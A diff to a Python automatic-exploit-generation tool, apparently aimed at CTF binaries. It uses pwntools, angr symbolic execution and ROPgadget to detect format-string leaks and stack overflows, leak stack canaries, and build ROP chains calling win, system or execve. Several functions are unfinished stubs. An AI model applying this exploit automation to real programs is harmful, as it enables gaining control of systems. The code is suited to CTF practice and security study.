@@ -18,8 +18,8 @@ context.update(
     endian="little",
     log_level="warning",
     os="linux",
-    terminal=["tmux", "split-window", "-h", "-p 65"]
-    #terminal=["st"]
+    #terminal=["tmux", "split-window", "-h", "-p 65"]
+    terminal=["st"]
 )
 
 # Important lists to use such as useful strings, the functions we want to call in our rop chain, the calling convention, and useful rop functions with gadgets
@@ -46,26 +46,108 @@ class rAEG:
 
         self.format_write_address = None
 
-        self.canary = None
-        self.canary_leak = None
+        self.has_leak = False
+        self.has_overflow = False
+
 
         self.flag = None
+
+    # Determine which exploit we need and return which type as a string
+    # Also determine the parameters needed, and the function to execute
+    def find_vulnerability(self):
+
+        # First find if it is a format string vulnerability
+        p = self.start_process(None)
+        p.sendline(b"%p")
+        p.recvuntil(b"<<<")
+        output = p.recvline()
+        logging.getLogger("pwnlib").setLevel(logging.INFO)
+        print(output)
+        if b"0x" in output or b"nil" in output:
+            self.has_leak = True
+            log.info(f"Found a format string vulnerability with {output}")
+            self.format_leak()
+
+            for symb in self.elf.sym:
+                if symb == "win":
+                    log.info("Found a win function with a format got overwrite")
+                    self.format_write()
+
+                if symb == "pwnme":
+                    log.info("Found a format overwrite")
+
+                if symb == "fopen":
+                    log.info("Found a format read")
+
+
+        else:
+            self.angry_stack_smash()
+
+            # Find important string in the binary
+            for s in strings:
+                output = subprocess.check_output(["ROPgadget", "--binary", self.binary, "--string", f"{s}"])
+                string_output = output.split(b"\n")[2].split(b" ")
+                if len(string_output) > 1:
+                    self.string_address = p64(int(string_output[0],16))
+                    log.info(f"Found string {s} at {hex(u64(self.string_address))}")
+                    break
+
+            if self.string_address == None:
+                log.warning("Couldn't find any useful strings")
+
+            params = []
+            # Find functions to use for exploit by enumerating through one win exploit functions
+            for symb in self.elf.sym:
+                if symb == "win":
+                    # Either ret2win, rop parameters, or format got overwrite
+                    self.exploit_function = "win"
+                    log.info("Found win function")
+                    break
+                elif symb == "system":
+                    self.exploit_function = "system"
+                    log.info("Found system function")
+                    params = [self.string_address, p64(0)]
+                    break
+                elif symb == "execve":
+                    self.exploit_function = "execve"
+                    params = [self.string_address, p64(0), p64(0)]
+                    log.info("Found execve function")
+                    break
+                elif symb == "syscall":
+                    self.exploit_function = "syscall"
+                    log.info("Found syscall function")
+                    params = [self.string_address, p64(0), p64(0)]
+                    break
+                elif symb == "print_file":
+                    self.exploit_function = "print_file"
+                    log.info("Found print_file function")
+                    params = [self.string_address]
+                    break
+
+            # Set functions and parameters as a dictionary set
+
+            self.parameters = params
+
+
+        return None
+
 
     # Function to check if there is a memory corruption which can lead to the instruction pointer being overwritten
     def check_mem_corruption(self, simgr):
         if len(simgr.unconstrained) > 0:
             for path in simgr.unconstrained:
-                path.add_constraints(path.regs.pc == b"CCCCCCCC")
+                path.add_constraints(path.regs.pc == b"AAAAAAAA")
                 if path.satisfiable():
                     stack_smash = path.solver.eval(self.symbolic_input, cast_to=bytes)
                     try:
-                        index = stack_smash.index(b"CCCCCCCC")
+                        index = stack_smash.index(b"AAAAAAAA")
                         self.symbolic_padding = stack_smash[:index]
-                        #log.info(f"Found symbolic padding: {self.symbolic_padding}")
+                        log.info(f"Found symbolic padding: {self.symbolic_padding}")
                         log.info(f"Successfully Smashed the Stack, Takes {len(self.symbolic_padding)} bytes to smash the instruction pointer")
                         simgr.stashes["mem_corrupt"].append(path)
                     except:
                         log.warning("Could not find index of pc overwrite")
+                        #log.info(f"{stack_smash}")
                 simgr.stashes["unconstrained"].remove(path)
                 simgr.drop(stash="active")
 
@@ -103,99 +185,26 @@ class rAEG:
             varg = state.solver.eval(state.regs.rsi)
             address = state.solver.eval(state.regs.rip)
 
+            # If rsi is not an address
             if varg <= 0xff:
                 self.last_printf_address = hex(state.callstack.current_return_target)
-                print(hex(state.callstack.current_return_target))
 
         self.proj.hook_symbol("printf", analyze_printf)
 
         log.info("Attempting to smash the stack")
         self.simgr.explore(step_func=self.check_mem_corruption)
-
         self.proj.hook_symbol("printf", analyze_printf)
+
+        if self.simgr.errored:
+            log.warning(f"Simulation errored with {self.simgr.errored[0]}")
 
         if len(self.simgr.stashes["mem_corrupt"]) <= 0:
             log.warning("Failed to smash stack")
 
+    def find_arguments(self, function, goal):
 
 
-    # Determine which exploit we need and return which type as a string
-    # Also determine the parameters needed, and the function to execute
-    def find_vulnerability(self):
-
-        # First find if it is a format string vulnerability
-        p = self.start_process(None)
-        p.sendline(b"%p")
-        #p.recvuntil(b"<<<")
-        #output = p.recvline()
-        logging.getLogger("pwnlib").setLevel(logging.INFO)
-        #if b":" in output:
-            #output = output.split(b":")[1]
-
-        #if not b"%p" in output :
-            #log.info(f"[+] Found a format string vulnerability with {output}")
-
-            # Check if win function
-
-            # Check if pwnme symbol is present
-
-
-            # Check if fopen symbol
-
-        #else:
-        self.format_leak()
-        self.angry_stack_smash()
-
-
-
-        # Find important string in the binary
-        for s in strings:
-            output = subprocess.check_output(["ROPgadget", "--binary", self.binary, "--string", f"{s}"])
-            string_output = output.split(b"\n")[2].split(b" ")
-            if len(string_output) > 1:
-                self.string_address = p64(int(string_output[0],16))
-                log.info(f"Found string {s} at {hex(u64(self.string_address))}")
-                break
-
-        if self.string_address == None:
-            log.warning("Couldn't find any useful strings")
-
-        params = []
-        # Find functions to use for exploit by enumerating through one win exploit functions
-        for symb in self.elf.sym:
-            if symb == "win":
-                # Either ret2win, rop parameters, or format got overwrite
-                self.exploit_function = "win"
-                log.info("Found win function")
-                break
-            elif symb == "system":
-                self.exploit_function = "system"
-                log.info("Found system function")
-                params = [self.string_address, p64(0)]
-                break
-            elif symb == "execve":
-                self.exploit_function = "execve"
-                params = [self.string_address, p64(0), p64(0)]
-                log.info("Found execve function")
-                break
-            elif symb == "syscall":
-                self.exploit_function = "syscall"
-                log.info("Found syscall function")
-                params = [self.string_address, p64(0), p64(0)]
-                break
-            elif symb == "print_file":
-                self.exploit_function = "print_file"
-                log.info("Found print_file function")
-                params = [self.string_address]
-                break
-
-        # Set functions and parameters as a dictionary set
-
-        self.parameters = params
-
-
-        return None
-
+    
     # Find pop gadgets to control register
     def find_pop_reg_gadget(self, register):
         # Filters out only pop instructions 
@@ -280,6 +289,7 @@ class rAEG:
         return None
 
     # Write string to writable address in the binary
+    # !TODO Change to be able to write different strings``
     def rop_chain_write_string(self):
         chain = b""
 
@@ -398,6 +408,7 @@ class rAEG:
         stack_len = 300
         string = ""
 
+        # Run the process for stack_len amount of times to leak the entire stack
         for  i in range(1, stack_len):
 
             if control == 1:
@@ -417,6 +428,7 @@ class rAEG:
                     address = response[0].decode()
                     response = response[0].strip(b"0x")
 
+                    # Find a the valid canary on the stack
                     canary = re.search(r"0x[a-f0-9]{14}00", address)
                     if canary and self.elf.canary:
                         self.canary_offset_string = offset_str
@@ -447,10 +459,65 @@ class rAEG:
                             control = 1
                     except:
                         log.info("RIP")
-
+                p.close()
             except:
                 log.info("BOZO")
+
         logging.getLogger("pwnlib").setLevel(logging.INFO)
+
+
+    def format_write(self):
+
+        self.proj = angr.Project(self.binary, load_options={"auto_load_libs":False})
+        start_addr = self.elf.sym["main"]
+        # Maybe change to symbolic file stream
+        buff_size = 30
+        sym_chars = [claripy.BVS("%d" % i, 8) for i in range(buff_size)]
+
+        self.symbolic_input = claripy.Concat(*sym_chars + [claripy.BVV(b"\n")])
+        self.symbolic_padding = None
+
+        cfg = self.proj.analyses.CFGFast()
+
+        self.state = self.proj.factory.blank_state(
+                addr=start_addr,
+                stdin=self.symbolic_input
+        )
+
+
+        for k in sym_chars:
+            self.state.solver.add(
+                self.state.solver.Or(
+                    self.state.solver.Or(
+                        self.state.solver.And(k >= ord("0"), k <= ord("9")),
+                        self.state.solver.Or(
+                            self.state.solver.Or(
+                                k == ord("p"),
+                                k == ord("d")
+                            ),
+                            k == ord("$")
+                        )
+                    ),
+                    k == ord("%")
+                )
+            )
+
+        self.simgr = self.proj.factory.simgr(self.state, save_unconstrained=True)
+        self.simgr.stashes["mem_corrupt"] = []
+
+        self.simgr.explore(step_func=self.check_mem_corruption)
+
+        if len(self.simgr.stashes["mem_corrupt"]) <= 0:
+            log.warning("Failed to format overwrite")
+        return None
+
+    # Function to resolve the libc base offset from the leak
+    def resolve_libc_offset(self, leak):
+        # Get libc base from debugger/angr
+
+        self.libc.address
+
+        return None
 
 
     def start_process(self, mode):
@@ -467,14 +534,7 @@ class rAEG:
         else:
             return process(self.binary)
 
-    # Function to resolve the libc base offset from the leak
-    def resolve_libc_offset(self, leak):
-        # Get libc base from debugger/angr
-
-        self.libc.address
-
-        return None
-
+    
     def exploit(self):
         #p = self.start_process("GDB")
         p = self.start_process(None)
